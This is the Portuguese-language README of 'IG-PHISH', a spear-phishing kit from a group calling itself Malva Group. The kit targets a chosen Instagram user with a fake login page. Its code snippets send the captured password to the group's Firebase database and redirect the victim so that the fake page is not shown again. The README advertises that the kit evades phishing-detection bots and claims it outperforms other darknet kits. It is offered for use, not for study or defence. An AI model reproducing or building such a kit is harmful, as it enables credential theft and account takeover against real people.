# IG-PHISH v1.0 by Malva Group

v1.0 - Atualizado em 07/09/2024


![ig.png](https://i.postimg.cc/7PQvxr7M/ig.png)

<!--
Para apagar a imagem acima do servidor onde ela está hospedada, acesse:
https://postimg.cc/delete/tc80740K/4231bd1d
-->


## Resumo

O "IG-PHISH" é um repositório que carrega códigos do tipo [__*Spear Phishing*__](https://www.kaspersky.com.br/resource-center/definitions/spear-phishing). Seu propósito é conseguir a senha de acesso do aplicativo Instagram de um alvo específico, o enganando com uma página falsa de captura de dados, muito parecida com a original.

> Necessário ter conhecimento em Front-End.

> Útil: [acesse aqui](https://postimg.cc/gallery/8GGy58z/af531079) a galeria de imagens da página `pageLog.html`

## Como funciona?

Pequena explicação em bullet points.

- O alvo (escolhido a dedo) recebe uma mensagem (em qualquer midia social) contendo um link.

        let alvoInfo = firebase.database().ref("Malva Group").child("App_IG").child("@usernamedoinsta");

    > Em `@usernamedoinsta`, ficará o @ do alvo.

- Ao clicar no link o usuário é levado a uma suposta página de confirmação do Instagram, alegando que como ele irá sair para um site externo, precisa fazer um login de identificação.

- Ao fazer a suposta identificação, ele acaba enviando os dados contidos no campo `p455` para um banco de dados de propriedade do __Malva Group__.

        let passeLog = p455Element.value.trim();
        coletarDoAlvo(passeLog);

    > Envia os dados do campo `p455` para o banco de dados.

- Logo após um script será executado, fazendo com que o browser salve a informação de que a página falsa de login foi aberta, e após o alvo será direcionado para uma página de escolha do grupo (vamos chamá-la de `página 2`).

        const specificLink = "link-escolhido.com/";
        const redirectKey = "redirectTo";

    > Redireciona para o link da `página 2`

- Como o browser salvou a informação que a página de falso login foi aberta, ele não irá abri-la novamente, e sim abrir a `página 2` instantaneamente.

    > Detalhe: caso o alvo limpe o `cache` do browser, a página de login inicial voltará a ser exibida.


## Feito para ser útil

Nós do __Malva Group__, fizemos de tudo para fazer os códigos cumprirem a sua função principal, desde o design até a preocupação com bots de verificação de phishing, garantindo maior tempo no ar e a maior taxa de sucesso dentre outros códigos de *Phishing* disponíveis na *darknet*.

## Veja mais sobre Spear Phishing

- <https://www.trendmicro.com/pt_br/what-is/phishing/types-of-phishing.html>
- <https://www.serasaexperian.com.br/conteudos/prevencao-a-fraude/o-que-e-spear-phishing>
- <https://www.mundoconectado.com.br/corporativo/grupo-russo-ligado-ao-kremlin-faz-ataque-phishing-global/>
- <https://www.mundoconectado.com.br/corporativo/grupo-russo-ligado-ao-kremlin-faz-ataque-phishing-global/>

---

© 2024 Malva Group, LLC